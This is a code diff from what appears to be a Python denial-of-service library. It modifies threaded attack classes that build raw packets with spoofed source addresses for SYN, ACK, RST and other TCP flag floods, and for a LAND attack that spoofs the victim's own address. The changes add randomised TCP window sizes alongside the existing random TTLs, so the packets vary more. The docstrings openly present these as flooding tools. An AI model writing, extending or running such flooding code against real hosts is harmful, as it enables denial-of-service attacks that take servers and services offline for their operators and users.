@@ -704,11 +704,12 @@ class pham(threading.Thread):
       if prints==True:
        print("Posted: {} --> {}".format(h,ipp))
       time.sleep(random.uniform(.1,3))
-     except:
+     except Exception as e:
+      print e
       break
     s.close()
-   except:
-    pass
+   except Exception as ex:
+    print ex
    time.sleep(.1)
    if stop==True:
     break
@@ -1736,10 +1737,12 @@ class sflood(threading.Thread):
     iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(self.minttl,self.maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
     tcr = (5 << 4) + 0
     tf = self.finf + (self.synf << 1) + (self.rstf << 2) + (self.pshf <<3) + (self.ackf << 4) + (self.urgf << 5)
-    if self.winds=='null':
+    if self.winds==0:
      windf=0
-    if self.winds=="random":
-     windf=random.randint(0,65535)
+    elif self.winds<0:
+     windf=random.randint(min_win,max_win)#actual window size= this value * 256
+    else:
+     windf=self.winds
     thd = pack('!HHLLBBHHH' , sp, self.port, 0 , self.ackf, 5, tf, socket.htons(windf) , 0, 0)
     source_address = socket.inet_aton( sip ) 
     dest_address = socket.inet_aton(dip) 
@@ -1756,7 +1759,7 @@ class sflood(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def synflood(u,p=80,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window="random",payloads=True,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
+def synflood(u,p=80,max_window=5840,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window=-1,payloads=True,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
@@ -1784,6 +1787,14 @@ def synflood(u,p=80,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,wi
 '''
   global stop
   stop=False
+  global max_win
+  max_win=max_window
+  if max_win>5840:
+   max_win=5840
+  global min_win
+  min_win=min_window
+  if min_win<0:
+   min_win=0
   global prints
   prints=logs
   global target
@@ -1929,10 +1940,12 @@ class ln(threading.Thread):
   time.sleep(2)
   while (stop!=True):
    try:
-    if self.winds=='null':
+    if self.winds==0:
      windf=0
-    if self.winds=="random":
-     windf=random.randint(0,65535)
+    elif self.winds<0:
+     windf=random.randint(min_win,max_win)#actual window size= this value * 256
+    else:
+     windf=self.winds
     if self.paylo==False:
      urd=''
      req='None'
@@ -1988,12 +2001,20 @@ class ln(threading.Thread):
     time.sleep(.1)
    except Exception as e:
     pass
-def land(u,p=80,threads=100,low=64,maxi=64,ampli=15,tcp=False,payloads=False,window="random",interval=300,logs=True,returning=False):
+def land(u,p=80,threads=100,max_window=5840,min_window=1,low=64,maxi=64,ampli=15,tcp=False,payloads=False,window=-1,interval=300,logs=True,returning=False):
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
  global stop
  stop=False
+ global max_win
+ max_win=max_window
+ if max_win>5840:
+   max_win=5840
+ global min_win
+ min_win=min_window
+ if min_win<0:
+   min_win=0
  global prints
  prints=logs
  global target
